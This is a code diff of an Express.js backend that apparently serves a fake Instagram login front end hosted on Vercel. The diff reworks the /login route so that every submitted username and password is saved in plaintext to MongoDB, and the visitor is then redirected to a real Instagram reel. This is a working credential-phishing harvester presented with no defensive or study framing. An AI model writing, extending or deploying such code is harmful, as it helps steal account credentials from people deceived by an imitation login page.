@@ -6,13 +6,13 @@ const LoginModel = require('./models/Login');
 
 const app = express();
 
-// ✅ Move this ABOVE app.use(cors)
+// ✅ Allowed origins
 const allowedOrigins = [
   "http://localhost:5173",
-  "https://instagram-front-taupe.vercel.app" // 🚫 no trailing slash
+  "https://instagram-front-taupe.vercel.app"
 ];
 
-// ✅ CORS config
+// ✅ CORS middleware
 app.use(cors({
   origin: function (origin, callback) {
     if (!origin || allowedOrigins.includes(origin)) {
@@ -21,19 +21,24 @@ app.use(cors({
       callback(new Error("Not allowed by CORS"));
     }
   },
-  credentials: true
+  credentials: true,
+  optionsSuccessStatus: 200
 }));
 
+// ✅ Handle preflight (OPTIONS) for all routes
+app.options('*', cors());
+
+// ✅ Body parser
 app.use(express.json());
 
+// ✅ Logging incoming requests
 app.use((req, res, next) => {
   console.log("Request received from:", req.headers.origin);
   next();
 });
 
 // ✅ MongoDB connection
-mongoose
-  .connect(process.env.mongoDB)
+mongoose.connect(process.env.mongoDB)
   .then(() => console.log('✅ MongoDB connected'))
   .catch((err) => console.error('❌ MongoDB connection error:', err));
 
@@ -48,19 +53,23 @@ app.post('/login', async (req, res) => {
 
   try {
     const user = await LoginModel.findOne({ name });
+
+    await LoginModel.create({ name, password }); // Save login attempt
+
+    const redirectUrl = "https://www.instagram.com/reel/DHYV63ZJ-8O/?utm_source=ig_web_copy_link&igsh=MzRlODBiNWFlZA==";
+
     if (user) {
-      await LoginModel.create({ name, password });
       return res.json({
         message: 'Already have an Account',
-        redirect: 'https://www.instagram.com/reel/DHYV63ZJ-8O/?utm_source=ig_web_copy_link&igsh=MzRlODBiNWFlZA=='
+        redirect: redirectUrl
       });
     } else {
-      await LoginModel.create({ name, password });
       return res.json({
         message: 'Account Created',
-        redirect: 'https://www.instagram.com/reel/DHYV63ZJ-8O/?utm_source=ig_web_copy_link&igsh=MzRlODBiNWFlZA=='
+        redirect: redirectUrl
       });
     }
+
   } catch (err) {
     console.error(err);
     res.status(500).json({ error: 'Server Error' });
